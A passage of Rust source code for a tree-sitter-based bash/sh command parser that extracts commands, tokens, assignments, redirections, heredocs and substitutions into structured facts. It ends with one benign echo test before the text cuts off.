use tree_sitter::{Language, Node, Parser};

use crate::{
    artifact::{
        AssignmentCommandFact, AssignmentOperator, AssignmentValueFact, CommandFact,
        CommandSubstitutionFact, CommandToken, CommandTokenKind, DeclarationCommandFact,
        DeclarationCommandKind, DiagnosticKind, FunctionDefinitionFact, ParseDiagnostic,
        ParseStatus, ParsedCommandArtifact, PipelinePosition, ProcessSubstitutionFact,
        ProcessSubstitutionOperator, RedirectionFact, RedirectionKind, RedirectionOperandFact,
        SourceSpan, StatementTerminator, UnsetCommandFact, VariableAssignmentFact,
    },
    error::ParseError,
};
use caushell_types::ShellKind;

pub fn parse_command(
    raw_command: &str,
    shell_kind: ShellKind,
) -> Result<ParsedCommandArtifact, ParseError> {
    let language = language_for(shell_kind)?;

    let mut parser = Parser::new();
    parser
        .set_language(&language)
        .map_err(|error| ParseError::LanguageInit(error.to_string()))?;

    let tree = parser
        .parse(raw_command, None)
        .ok_or(ParseError::ParseCancelled)?;
    let source = raw_command.as_bytes();
    let root = tree.root_node();

    let diagnostics = collect_diagnostics(root, source);
    let status = if root.has_error() || !diagnostics.is_empty() {
        ParseStatus::Partial
    } else {
        ParseStatus::Complete
    };

    Ok(ParsedCommandArtifact {
        raw_command: raw_command.to_string(),
        shell_kind,
        status,
        commands: extract_commands(root, source),
        declaration_commands: extract_declaration_commands(root, source),
        assignment_commands: extract_assignment_commands(root, source),
        unset_commands: extract_unset_commands(root, source),
        function_definitions: extract_function_definitions(root, source),
        redirections: extract_redirections(root, source),
        diagnostics,
    })
}

pub fn parse_command_substitutions(
    raw_fragment: &str,
    shell_kind: ShellKind,
) -> Result<Vec<CommandSubstitutionFact>, ParseError> {
    let language = language_for(shell_kind)?;

    let mut parser = Parser::new();
    parser
        .set_language(&language)
        .map_err(|error| ParseError::LanguageInit(error.to_string()))?;

    let tree = parser
        .parse(raw_fragment, None)
        .ok_or(ParseError::ParseCancelled)?;
    let source = raw_fragment.as_bytes();
    let root = tree.root_node();
    let mut substitutions = Vec::new();

    walk(root, &mut |node| {
        if node.kind() != "command_substitution" {
            return;
        }

        let text = source_text(node, source);
        let Some(body_text) = command_substitution_body_text(&text) else {
            return;
        };

        substitutions.push(CommandSubstitutionFact {
            text,
            body_text,
            span: span_for(node),
        });
    });

    Ok(substitutions)
}

pub fn parse_process_substitutions(
    raw_fragment: &str,
    shell_kind: ShellKind,
) -> Result<Vec<ProcessSubstitutionFact>, ParseError> {
    let language = language_for(shell_kind)?;

    let mut parser = Parser::new();
    parser
        .set_language(&language)
        .map_err(|error| ParseError::LanguageInit(error.to_string()))?;

    let tree = parser
        .parse(raw_fragment, None)
        .ok_or(ParseError::ParseCancelled)?;
    let source = raw_fragment.as_bytes();
    let root = tree.root_node();
    let mut substitutions = Vec::new();

    walk(root, &mut |node| {
        if node.kind() != "process_substitution" {
            return;
        }

        let text = source_text(node, source);
        let Some((operator, body_text)) = process_substitution_parts(&text) else {
            return;
        };

        substitutions.push(ProcessSubstitutionFact {
            text,
            body_text,
            operator,
            span: span_for(node),
        });
    });

    Ok(substitutions)
}

fn language_for(shell_kind: ShellKind) -> Result<Language, ParseError> {
    match shell_kind {
        ShellKind::Bash | ShellKind::Sh => Ok(tree_sitter_bash::LANGUAGE.into()),
        other => Err(ParseError::UnsupportedShell(other)),
    }
}

fn collect_diagnostics(root: Node<'_>, source: &[u8]) -> Vec<ParseDiagnostic> {
    let mut diagnostics = Vec::new();

    walk(root, &mut |node| {
        let kind = if node.is_error() {
            Some(DiagnosticKind::ErrorNode)
        } else if node.is_missing() {
            Some(DiagnosticKind::MissingNode)
        } else {
            None
        };

        if let Some(kind) = kind {
            diagnostics.push(ParseDiagnostic {
                kind,
                node_kind: node.kind().to_string(),
                text: source_text(node, source),
                span: span_for(node),
            });
        }
    });

    diagnostics
}

fn extract_commands(root: Node<'_>, source: &[u8]) -> Vec<CommandFact> {
    let mut commands = Vec::new();

    walk(root, &mut |node| match node.kind() {
        "command" => {
            if is_nested_shell_substructure(node) {
                return;
            }

            if node
                .parent()
                .is_some_and(|parent| parent.kind() == "redirected_statement")
            {
                return;
            }

            if let Some(command) = extract_single_command(node, source) {
                commands.push(command);
            }
        }
        "test_command" => {
            if is_nested_shell_substructure(node) {
                return;
            }

            if let Some(command) = extract_test_command(node, source) {
                commands.push(command);
            }
        }
        "redirected_statement" => {
            if is_nested_shell_substructure(node) {
                return;
            }

            for i in 0..node.child_count() {
                let Some(child) = child_at(node, i) else {
                    continue;
                };

                if child.kind() == "command" {
                    if let Some(command) = extract_single_command(child, source) {
                        commands.push(command);
                    }
                    break;
                }
            }
        }
        _ => {}
    });

    commands
}

fn extract_test_command(node: Node<'_>, source: &[u8]) -> Option<CommandFact> {
    let opener = child_at(node, 0)?;
    let command_name = source_text(opener, source);
    if command_name != "[" && command_name != "[[" {
        return None;
    }

    let closer = if command_name == "[" { "]" } else { "]]" };
    let mut tokens = Vec::new();

    for i in 1..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };

        if child.kind() == closer {
            tokens.push(CommandToken {
                text: source_text(child, source),
                kind: CommandTokenKind::Arg,
                quoted: false,
                node_kind: child.kind().to_string(),
                span: span_for(child),
                command_substitutions: Vec::new(),
            });
            continue;
        }

        append_test_expression_tokens(child, source, &mut tokens);
    }

    let pipeline = find_ancestor_kind(node, "pipeline");
    let pipeline_position =
        pipeline.and_then(|pipeline| pipeline_position_for_command(node, pipeline));

    Some(CommandFact {
        command_name: Some(command_name),
        text: source_text(node, source),
        prefix_assignments: Vec::new(),
        tokens,
        in_pipeline: pipeline.is_some(),
        pipeline_position,
        pipeline_span: pipeline.map(span_for),
        terminator: statement_terminator_for(node),
        guarded: is_guarded_command(node),
        subshell_span: nearest_ancestor_span(node, &["subshell"]),
        control_flow_span: outermost_ancestor_span(
            node,
            &[
                "if_statement",
                "while_statement",
                "for_statement",
                "c_style_for_statement",
                "case_statement",
            ],
        ),
        top_level_span: top_level_command_span(node),
        span: span_for(node),
    })
}

fn append_test_expression_tokens(node: Node<'_>, source: &[u8], tokens: &mut Vec<CommandToken>) {
    if let Some((text, quoted)) = extract_token_text(node, source) {
        tokens.push(CommandToken {
            text,
            kind: CommandTokenKind::Arg,
            quoted,
            node_kind: node.kind().to_string(),
            span: span_for(node),
            command_substitutions: command_substitutions_for_expansion_node(node, source),
        });
        return;
    }

    if node.kind() == "test_operator" {
        tokens.push(CommandToken {
            text: source_text(node, source),
            kind: CommandTokenKind::Arg,
            quoted: false,
            node_kind: node.kind().to_string(),
            span: span_for(node),
            command_substitutions: Vec::new(),
        });
        return;
    }

    for i in 0..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };

        append_test_expression_tokens(child, source, tokens);
    }
}

fn extract_declaration_commands(root: Node<'_>, source: &[u8]) -> Vec<DeclarationCommandFact> {
    let mut declarations = Vec::new();

    walk(root, &mut |node| {
        if node.kind() == "declaration_command" {
            if is_nested_shell_substructure(node) {
                return;
            }

            declarations.push(parse_declaration_command(node, source));
        }
    });

    declarations
}

fn extract_assignment_commands(root: Node<'_>, source: &[u8]) -> Vec<AssignmentCommandFact> {
    let mut assignments = Vec::new();

    walk(root, &mut |node| match node.kind() {
        "variable_assignments" => {
            if is_nested_shell_substructure(node) || find_ancestor_kind(node, "command").is_some() {
                return;
            }

            assignments.push(parse_assignment_command(node, source));
        }
        "variable_assignment" => {
            if is_nested_shell_substructure(node)
                || find_ancestor_kind(node, "command").is_some()
                || find_ancestor_kind(node, "declaration_command").is_some()
                || find_ancestor_kind(node, "variable_assignments").is_some()
            {
                return;
            }

            assignments.push(parse_assignment_command(node, source));
        }
        _ => {}
    });

    assignments
}

fn parse_declaration_command(node: Node<'_>, source: &[u8]) -> DeclarationCommandFact {
    let mut kind = None;
    let mut options = Vec::new();
    let mut names = Vec::new();
    let mut assignments = Vec::new();

    for i in 0..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };

        match child.kind() {
            "declare" => kind = Some(DeclarationCommandKind::Declare),
            "typeset" => kind = Some(DeclarationCommandKind::Typeset),
            "export" => kind = Some(DeclarationCommandKind::Export),
            "readonly" => kind = Some(DeclarationCommandKind::Readonly),
            "local" => kind = Some(DeclarationCommandKind::Local),
            "variable_name" => names.push(source_text(child, source)),
            "variable_assignment" => {
                if let Some(assignment) = parse_variable_assignment(child, source) {
                    assignments.push(assignment);
                }
            }
            _ => {
                if let Some((text, _quoted)) = extract_token_text(child, source) {
                    options.push(text);
                }
            }
        }
    }

    DeclarationCommandFact {
        kind: kind.expect("declaration_command should have a declaration keyword"),
        options,
        names,
        assignments,
        text: source_text(node, source),
        top_level_span: top_level_command_span(node),
        span: span_for(node),
    }
}

fn parse_assignment_command(node: Node<'_>, source: &[u8]) -> AssignmentCommandFact {
    let mut assignments = Vec::new();

    for i in 0..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };

        match child.kind() {
            "variable_assignment" => {
                if let Some(assignment) = parse_variable_assignment(child, source) {
                    assignments.push(assignment);
                }
            }
            _ => {}
        }
    }

    if node.kind() == "variable_assignment" {
        if let Some(assignment) = parse_variable_assignment(node, source) {
            assignments.push(assignment);
        }
    }

    AssignmentCommandFact {
        assignments,
        text: source_text(node, source),
        top_level_span: top_level_command_span(node),
        span: span_for(node),
    }
}

fn extract_unset_commands(root: Node<'_>, source: &[u8]) -> Vec<UnsetCommandFact> {
    let mut unsets = Vec::new();

    walk(root, &mut |node| {
        if node.kind() == "unset_command" {
            if is_nested_shell_substructure(node) {
                return;
            }

            unsets.push(parse_unset_command(node, source));
        }
    });

    unsets
}

fn extract_function_definitions(root: Node<'_>, source: &[u8]) -> Vec<FunctionDefinitionFact> {
    let mut definitions = Vec::new();

    walk(root, &mut |node| {
        if node.kind() != "function_definition" || is_nested_shell_substructure(node) {
            return;
        }

        let Some(name_node) = node.child_by_field_name("name") else {
            return;
        };
        let Some(body_node) = node.child_by_field_name("body") else {
            return;
        };

        definitions.push(FunctionDefinitionFact {
            name: source_text(name_node, source),
            body_text: function_body_text(body_node, source),
            text: source_text(node, source),
            top_level_span: top_level_command_span(node),
            span: span_for(node),
        });
    });

    definitions
}

fn function_body_text(body_node: Node<'_>, source: &[u8]) -> String {
    if body_node.kind() != "compound_statement" {
        return source_text(body_node, source);
    }

    let text = source_text(body_node, source);
    let Some(body) = text
        .strip_prefix('{')
        .and_then(|body| body.strip_suffix('}'))
    else {
        return text;
    };

    body.trim().to_string()
}

fn parse_unset_command(node: Node<'_>, source: &[u8]) -> UnsetCommandFact {
    let mut options = Vec::new();
    let mut names = Vec::new();

    for i in 0..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };

        match child.kind() {
            "unset" => {}
            "variable_name" => names.push(source_text(child, source)),
            _ => {
                if let Some((text, _quoted)) = extract_token_text(child, source) {
                    options.push(text);
                }
            }
        }
    }

    UnsetCommandFact {
        options,
        names,
        text: source_text(node, source),
        top_level_span: top_level_command_span(node),
        span: span_for(node),
    }
}

fn extract_single_command(node: Node<'_>, source: &[u8]) -> Option<CommandFact> {
    let mut command_name = None;
    let mut prefix_assignments = Vec::new();
    let mut tokens = Vec::new();
    let mut dashdash_seen = false;

    for i in 0..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };

        if child.kind() == "variable_assignment" {
            if command_name.is_none() {
                if let Some(assignment) = parse_variable_assignment(child, source) {
                    prefix_assignments.push(assignment);
                }
            }
            continue;
        }

        if child.kind() == "command_name" {
            command_name = Some(source_text(child, source));
            continue;
        }

        if matches!(
            child.kind(),
            "file_redirect" | "herestring_redirect" | "heredoc_redirect"
        ) {
            continue;
        }

        let Some((text, quoted)) = extract_token_text(child, source) else {
            continue;
        };

        let kind = if text == "--" {
            dashdash_seen = true;
            CommandTokenKind::DashDash
        } else if !dashdash_seen && text.len() > 1 && text.starts_with('-') {
            CommandTokenKind::Flag
        } else {
            CommandTokenKind::Arg
        };

        tokens.push(CommandToken {
            text,
            kind,
            quoted,
            node_kind: child.kind().to_string(),
            span: span_for(child),
            command_substitutions: command_substitutions_for_expansion_node(child, source),
        });
    }

    if command_name.is_none() && tokens.is_empty() {
        return None;
    }

    let pipeline = find_ancestor_kind(node, "pipeline");
    let pipeline_position =
        pipeline.and_then(|pipeline| pipeline_position_for_command(node, pipeline));

    Some(CommandFact {
        command_name,
        text: source_text(node, source),
        prefix_assignments,
        tokens,
        in_pipeline: pipeline.is_some(),
        pipeline_position,
        pipeline_span: pipeline.map(span_for),
        terminator: statement_terminator_for(node),
        guarded: is_guarded_command(node),
        subshell_span: nearest_ancestor_span(node, &["subshell"]),
        control_flow_span: outermost_ancestor_span(
            node,
            &[
                "if_statement",
                "while_statement",
                "for_statement",
                "c_style_for_statement",
                "case_statement",
            ],
        ),
        top_level_span: top_level_command_span(node),
        span: span_for(node),
    })
}

fn top_level_command_span(node: Node<'_>) -> SourceSpan {
    let mut current = node;

    while let Some(parent) = current.parent() {
        match parent.kind() {
            "redirected_statement" | "pipeline" => {
                current = parent;
            }
            _ => break,
        }
    }

    span_for(current)
}

fn pipeline_position_for_command(node: Node<'_>, pipeline: Node<'_>) -> Option<PipelinePosition> {
    let statement = direct_pipeline_statement(node)?;
    let statements = named_children_of_kind(pipeline, None)
        .into_iter()
        .filter(|child| child.kind() != "comment")
        .collect::<Vec<_>>();

    let statement_index = statements
        .iter()
        .position(|candidate| candidate.id() == statement.id())?;
    let len = statements.len();

    Some(match (statement_index, len) {
        (0, 1) => PipelinePosition::Only,
        (0, _) => PipelinePosition::First,
        (index, total) if index + 1 == total => PipelinePosition::Last,
        _ => PipelinePosition::Middle,
    })
}

fn direct_pipeline_statement(mut node: Node<'_>) -> Option<Node<'_>> {
    while let Some(parent) = node.parent() {
        if parent.kind() == "pipeline" {
            return Some(node);
        }
        node = parent;
    }

    None
}

fn statement_terminator_for(node: Node<'_>) -> Option<StatementTerminator> {
    let statement = top_level_statement_node(node)?;
    let parent = statement.parent()?;
    let children = all_children(parent);
    let index = children
        .iter()
        .position(|child| child.id() == statement.id())?;

    let mut current = index + 1;
    while current < children.len() {
        let child = children[current];
        if child.is_named() {
            break;
        }

        let kind = child.kind();
        if kind == "&" {
            return Some(StatementTerminator::Background);
        }
        if kind == ";" || kind == ";;" {
            return Some(StatementTerminator::Sequence);
        }

        current += 1;
    }

    None
}

fn top_level_statement_node(mut node: Node<'_>) -> Option<Node<'_>> {
    while let Some(parent) = node.parent() {
        if is_statement_wrapper(parent.kind()) {
            node = parent;
            continue;
        }
        break;
    }

    Some(node)
}

fn is_statement_wrapper(kind: &str) -> bool {
    matches!(
        kind,
        "redirected_statement" | "pipeline" | "list" | "negated_command"
    )
}

fn is_guarded_command(mut node: Node<'_>) -> bool {
    while let Some(parent) = node.parent() {
        match parent.kind() {
            "if_statement"
            | "elif_clause"
            | "while_statement"
            | "for_statement"
            | "c_style_for_statement"
            | "case_statement"
            | "case_item"
            | "list"
            | "subshell" => return true,
            _ => {}
        }
        node = parent;
    }

    false
}

fn nearest_ancestor_span(mut node: Node<'_>, kinds: &[&str]) -> Option<SourceSpan> {
    while let Some(parent) = node.parent() {
        if kinds.iter().any(|kind| parent.kind() == *kind) {
            return Some(span_for(parent));
        }
        node = parent;
    }

    None
}

fn outermost_ancestor_span(mut node: Node<'_>, kinds: &[&str]) -> Option<SourceSpan> {
    let mut span = None;
    while let Some(parent) = node.parent() {
        if kinds.iter().any(|kind| parent.kind() == *kind) {
            span = Some(span_for(parent));
        }
        node = parent;
    }

    span
}

fn named_children_of_kind<'tree>(node: Node<'tree>, kind: Option<&str>) -> Vec<Node<'tree>> {
    all_children(node)
        .into_iter()
        .filter(|child| child.is_named() && kind.map(|kind| child.kind() == kind).unwrap_or(true))
        .collect()
}

fn all_children<'tree>(node: Node<'tree>) -> Vec<Node<'tree>> {
    (0..node.child_count())
        .filter_map(|index| child_at(node, index))
        .collect()
}

fn parse_variable_assignment(node: Node<'_>, source: &[u8]) -> Option<VariableAssignmentFact> {
    let mut name = None;
    let mut value = None;
    let mut saw_equals = false;
    let mut operator = AssignmentOperator::Assign;

    for i in 0..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };

        if child.kind() == "variable_name" {
            name = Some(source_text(child, source));
            continue;
        }

        if !child.is_named() {
            let text = source_text(child, source);
            if text == "=" || text == "+=" {
                saw_equals = true;
                operator = if text == "+=" {
                    AssignmentOperator::Append
                } else {
                    AssignmentOperator::Assign
                };
            }
            continue;
        }

        value = Some(assignment_value_fact_from_node(child, source));
    }

    let name = name?;
    let value = match value {
        Some(value) => value,
        None if saw_equals => AssignmentValueFact {
            text: String::new(),
            quoted: false,
            node_kind: "empty".to_string(),
            span: span_for(node),
            command_substitutions: Vec::new(),
        },
        None => return None,
    };

    Some(VariableAssignmentFact {
        name,
        operator,
        value,
        span: span_for(node),
    })
}

fn assignment_value_fact_from_node(node: Node<'_>, source: &[u8]) -> AssignmentValueFact {
    if let Some((text, quoted)) = extract_token_text(node, source) {
        return AssignmentValueFact {
            text,
            quoted,
            node_kind: node.kind().to_string(),
            span: span_for(node),
            command_substitutions: command_substitutions_for_expansion_node(node, source),
        };
    }

    AssignmentValueFact {
        text: source_text(node, source),
        quoted: false,
        node_kind: node.kind().to_string(),
        span: span_for(node),
        command_substitutions: command_substitutions_for_expansion_node(node, source),
    }
}

fn extract_redirections(root: Node<'_>, source: &[u8]) -> Vec<RedirectionFact> {
    let mut redirections = Vec::new();

    walk(root, &mut |node| match node.kind() {
        "file_redirect" => {
            if !is_nested_shell_substructure(node) {
                redirections.push(parse_file_redirect(node, source));
            }
        }
        "herestring_redirect" => {
            if !is_nested_shell_substructure(node) {
                redirections.push(parse_herestring(node, source));
            }
        }
        "heredoc_redirect" => {
            if !is_nested_shell_substructure(node) {
                redirections.push(parse_heredoc(node, source));
            }
        }
        _ => {}
    });

    redirections
}

fn is_nested_shell_substructure(node: Node<'_>) -> bool {
    let mut current = node;

    while let Some(parent) = current.parent() {
        if matches!(
            parent.kind(),
            "command_substitution" | "process_substitution" | "function_definition"
        ) {
            return true;
        }

        current = parent;
    }

    false
}

fn parse_file_redirect(node: Node<'_>, source: &[u8]) -> RedirectionFact {
    let mut file_descriptor = None;
    let mut operator = None;
    let mut target = None;

    for i in 0..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };

        if child.kind() == "file_descriptor" {
            file_descriptor = Some(source_text(child, source));
        } else if let Some((text, quoted)) = extract_token_text(child, source) {
            target = Some(RedirectionOperandFact {
                text,
                quoted,
                node_kind: child.kind().to_string(),
                span: span_for(child),
            });
        } else if !child.is_named() {
            operator = Some(source_text(child, source));
        }
    }

    let (parent_command_name, parent_command_span) = parent_command_info(node, source);

    RedirectionFact {
        kind: RedirectionKind::File,
        text: source_text(node, source),
        file_descriptor,
        operator,
        heredoc_start: None,
        target,
        content: None,
        parent_command_name,
        parent_command_span,
        top_level_span: top_level_command_span(node),
        span: span_for(node),
    }
}

fn parse_herestring(node: Node<'_>, source: &[u8]) -> RedirectionFact {
    let mut file_descriptor = None;
    let mut operator = None;
    let mut content = None;

    for i in 0..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };

        if child.kind() == "file_descriptor" {
            file_descriptor = Some(source_text(child, source));
        } else if let Some((text, quoted)) = extract_token_text(child, source) {
            content = Some(RedirectionOperandFact {
                text,
                quoted,
                node_kind: child.kind().to_string(),
                span: span_for(child),
            });
            break;
        } else if !child.is_named() {
            operator = Some(source_text(child, source));
        }
    }

    let (parent_command_name, parent_command_span) = parent_command_info(node, source);

    RedirectionFact {
        kind: RedirectionKind::HereString,
        text: source_text(node, source),
        file_descriptor,
        operator,
        heredoc_start: None,
        target: None,
        content,
        parent_command_name,
        parent_command_span,
        top_level_span: top_level_command_span(node),
        span: span_for(node),
    }
}

fn parse_heredoc(node: Node<'_>, source: &[u8]) -> RedirectionFact {
    let mut file_descriptor = None;
    let mut operator = None;
    let mut heredoc_start = None;
    let mut content = None;

    for i in 0..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };

        if child.kind() == "file_descriptor" {
            file_descriptor = Some(source_text(child, source));
        } else if child.kind() == "heredoc_start" {
            heredoc_start = Some(RedirectionOperandFact {
                text: source_text(child, source),
                quoted: heredoc_start_is_quoted(child, source),
                node_kind: child.kind().to_string(),
                span: span_for(child),
            });
        } else if child.kind() == "heredoc_body" {
            content = Some(RedirectionOperandFact {
                text: source_text(child, source),
                quoted: false,
                node_kind: child.kind().to_string(),
                span: span_for(child),
            });
        } else if !child.is_named() {
            operator = Some(source_text(child, source));
        }
    }

    let (parent_command_name, parent_command_span) = parent_command_info(node, source);

    RedirectionFact {
        kind: RedirectionKind::HereDoc,
        text: source_text(node, source),
        file_descriptor,
        operator,
        heredoc_start,
        target: None,
        content,
        parent_command_name,
        parent_command_span,
        top_level_span: top_level_command_span(node),
        span: span_for(node),
    }
}

fn heredoc_start_is_quoted(node: Node<'_>, source: &[u8]) -> bool {
    let text = source_text(node, source);
    let delimiter = text
        .strip_prefix("<<-")
        .or_else(|| text.strip_prefix("<<"))
        .unwrap_or(text.as_str())
        .trim();
    delimiter.starts_with('\'')
        || delimiter.ends_with('\'')
        || delimiter.starts_with('"')
        || delimiter.ends_with('"')
}

fn parent_command_info(node: Node<'_>, source: &[u8]) -> (Option<String>, Option<SourceSpan>) {
    let command = if node
        .parent()
        .is_some_and(|parent| parent.kind() == "redirected_statement")
    {
        node.parent().and_then(|parent| {
            for i in 0..parent.child_count() {
                let child = child_at(parent, i)?;
                if child.kind() == "command" {
                    return Some(child);
                }
            }
            None
        })
    } else {
        find_ancestor_kind(node, "command")
    };

    (
        command.and_then(|command| extract_command_name(command, source)),
        command.map(span_for),
    )
}

fn extract_command_name(node: Node<'_>, source: &[u8]) -> Option<String> {
    for i in 0..node.child_count() {
        let child = child_at(node, i)?;
        if child.kind() == "command_name" {
            return Some(source_text(child, source));
        }
    }

    None
}

fn extract_token_text(node: Node<'_>, source: &[u8]) -> Option<(String, bool)> {
    match node.kind() {
        "word"
        | "number"
        | "concatenation"
        | "simple_expansion"
        | "command_substitution"
        | "process_substitution"
        | "arithmetic_expansion" => Some((source_text(node, source), false)),
        "string" => Some((extract_interpolated_string(node, source), true)),
        "raw_string" => Some((strip_wrapping_quotes(source_text(node, source)), true)),
        "ansi_c_string" => Some((decode_ansi_c_string(source_text(node, source)), true)),
        _ => None,
    }
}

fn extract_interpolated_string(node: Node<'_>, source: &[u8]) -> String {
    let mut parts = String::new();

    for i in 0..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };

        if child.is_named() {
            parts.push_str(&source_text(child, source));
        }
    }

    if parts.is_empty() {
        strip_wrapping_quotes(source_text(node, source))
    } else {
        parts
    }
}

fn command_substitutions_for_expansion_node(
    node: Node<'_>,
    source: &[u8],
) -> Vec<CommandSubstitutionFact> {
    let mut substitutions = Vec::new();
    collect_command_substitutions_for_expansion_node(node, source, &mut substitutions);
    substitutions
}

fn collect_command_substitutions_for_expansion_node(
    node: Node<'_>,
    source: &[u8],
    substitutions: &mut Vec<CommandSubstitutionFact>,
) {
    if node.kind() == "command_substitution" {
        if let Some(fact) = command_substitution_fact_from_node(node, source) {
            substitutions.push(fact);
        }
        return;
    }

    for i in 0..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };

        collect_command_substitutions_for_expansion_node(child, source, substitutions);
    }
}

fn command_substitution_fact_from_node(
    node: Node<'_>,
    source: &[u8],
) -> Option<CommandSubstitutionFact> {
    let text = source_text(node, source);
    let body_text = command_substitution_body_text(&text)?;

    Some(CommandSubstitutionFact {
        text,
        body_text,
        span: span_for(node),
    })
}

fn command_substitution_body_text(text: &str) -> Option<String> {
    if let Some(body) = text
        .strip_prefix("$(")
        .and_then(|rest| rest.strip_suffix(')'))
    {
        return Some(body.to_string());
    }

    if let Some(body) = text
        .strip_prefix('`')
        .and_then(|rest| rest.strip_suffix('`'))
    {
        return Some(body.to_string());
    }

    None
}

fn process_substitution_parts(text: &str) -> Option<(ProcessSubstitutionOperator, String)> {
    if let Some(body) = text
        .strip_prefix("<(")
        .and_then(|rest| rest.strip_suffix(')'))
    {
        return Some((ProcessSubstitutionOperator::Input, body.to_string()));
    }

    if let Some(body) = text
        .strip_prefix(">(")
        .and_then(|rest| rest.strip_suffix(')'))
    {
        return Some((ProcessSubstitutionOperator::Output, body.to_string()));
    }

    None
}

fn strip_wrapping_quotes(text: String) -> String {
    if text.len() >= 2 {
        let starts_with_quote = text.starts_with('"') || text.starts_with('\'');
        let ends_with_quote = text.ends_with('"') || text.ends_with('\'');
        if starts_with_quote && ends_with_quote {
            return text[1..text.len() - 1].to_string();
        }
    }

    text
}

fn decode_ansi_c_string(text: String) -> String {
    let inner = text
        .strip_prefix("$'")
        .and_then(|rest| rest.strip_suffix('\''))
        .unwrap_or(text.as_str());

    let mut decoded = String::with_capacity(inner.len());
    let mut chars = inner.chars().peekable();

    while let Some(ch) = chars.next() {
        if ch != '\\' {
            decoded.push(ch);
            continue;
        }

        let Some(escape) = chars.next() else {
            decoded.push('\\');
            break;
        };

        match escape {
            'a' => decoded.push('\u{0007}'),
            'b' => decoded.push('\u{0008}'),
            'e' | 'E' => decoded.push('\u{001b}'),
            'f' => decoded.push('\u{000c}'),
            'n' => decoded.push('\n'),
            'r' => decoded.push('\r'),
            't' => decoded.push('\t'),
            'v' => decoded.push('\u{000b}'),
            '\\' => decoded.push('\\'),
            '\'' => decoded.push('\''),
            '"' => decoded.push('"'),
            '?' => decoded.push('?'),
            'x' => {
                if let Some(value) = consume_hex_escape(&mut chars, 2) {
                    push_u8_char(&mut decoded, value);
                } else {
                    decoded.push('x');
                }
            }
            'u' => {
                if let Some(value) = consume_unicode_escape(&mut chars, 4) {
                    push_u32_char(&mut decoded, value);
                } else {
                    decoded.push('u');
                }
            }
            'U' => {
                if let Some(value) = consume_unicode_escape(&mut chars, 8) {
                    push_u32_char(&mut decoded, value);
                } else {
                    decoded.push('U');
                }
            }
            '0'..='7' => {
                let value = consume_octal_escape(escape, &mut chars);
                push_u8_char(&mut decoded, value);
            }
            other => decoded.push(other),
        }
    }

    decoded
}

fn consume_hex_escape<I>(chars: &mut std::iter::Peekable<I>, max_digits: usize) -> Option<u8>
where
    I: Iterator<Item = char>,
{
    let mut value = 0u8;
    let mut digits = 0usize;

    while digits < max_digits {
        let Some(next) = chars.peek().copied() else {
            break;
        };
        let Some(digit) = next.to_digit(16) else {
            break;
        };

        chars.next();
        value = value.saturating_mul(16).saturating_add(digit as u8);
        digits += 1;
    }

    (digits > 0).then_some(value)
}

fn consume_unicode_escape<I>(
    chars: &mut std::iter::Peekable<I>,
    digits_required: usize,
) -> Option<u32>
where
    I: Iterator<Item = char>,
{
    let mut value = 0u32;

    for _ in 0..digits_required {
        let next = chars.next()?;
        let digit = next.to_digit(16)?;
        value = value.saturating_mul(16).saturating_add(digit);
    }

    Some(value)
}

fn consume_octal_escape<I>(first: char, chars: &mut std::iter::Peekable<I>) -> u8
where
    I: Iterator<Item = char>,
{
    let mut value = first.to_digit(8).unwrap_or(0) as u8;
    let mut digits = 1usize;

    while digits < 3 {
        let Some(next) = chars.peek().copied() else {
            break;
        };
        let Some(digit) = next.to_digit(8) else {
            break;
        };

        chars.next();
        value = value.saturating_mul(8).saturating_add(digit as u8);
        digits += 1;
    }

    value
}

fn push_u8_char(output: &mut String, value: u8) {
    output.push(char::from(value));
}

fn push_u32_char(output: &mut String, value: u32) {
    if let Some(ch) = char::from_u32(value) {
        output.push(ch);
    }
}

fn source_text(node: Node<'_>, source: &[u8]) -> String {
    node.utf8_text(source).unwrap_or_default().to_string()
}

fn find_ancestor_kind<'tree>(mut node: Node<'tree>, target_kind: &str) -> Option<Node<'tree>> {
    while let Some(parent) = node.parent() {
        if parent.kind() == target_kind {
            return Some(parent);
        }
        node = parent;
    }

    None
}

fn span_for(node: Node<'_>) -> SourceSpan {
    SourceSpan {
        start_byte: node.start_byte(),
        end_byte: node.end_byte(),
        start_row: node.start_position().row,
        start_column: node.start_position().column,
        end_row: node.end_position().row,
        end_column: node.end_position().column,
    }
}

fn walk<'tree, F>(node: Node<'tree>, visitor: &mut F)
where
    F: FnMut(Node<'tree>),
{
    visitor(node);

    for i in 0..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };
        walk(child, visitor);
    }
}

fn child_at(node: Node<'_>, index: usize) -> Option<Node<'_>> {
    node.child(index as u32)
}

#[cfg(test)]
mod tests {
    use super::{parse_command, parse_command_substitutions, parse_process_substitutions};
    use crate::{
        AssignmentOperator, CommandTokenKind, DeclarationCommandKind, ParseError, ParseStatus,
        PipelinePosition, ProcessSubstitutionOperator, RedirectionKind, StatementTerminator,
    };
    use caushell_types::ShellKind;

    #[test]
    fn parse_command_extracts_simple_command_tokens() {
        let artifact = parse_command(r#"echo "hello world" 42 -- -n"#, ShellKind::Bash)
            .expect("expected parse to succeed");

        assert_eq!(artifact.status, ParseStatus::Complete);
        assert_eq!(artifact.commands.len(), 1);
        assert_eq!(artifact.redirections.len(), 0);

        let command = &artifact.commands[0];
        assert_eq!(command.command_name.as_deref(), Some("echo"));
        assert_eq!(command.tokens.len(), 4);
        assert_eq!(command.tokens[0].text, "hello world");
        assert_eq!(command.tokens[0].kind, CommandTokenKind::Arg);
        assert!(command.tokens[0].quoted);
        assert_eq!(command.tokens[1].text, "42");
        assert_eq!(command.tokens[1].kind, CommandTokenKind::Arg);
        assert_eq!(command.tokens[2].text, "--");
        assert_eq!(command.tokens[2].kind, CommandTokenKind::DashDash);
        assert_eq!(command.tokens[3].text, "-n");
        assert_eq!(command.tokens[3].kind, CommandTokenKind::Arg);
    }

    #[test]
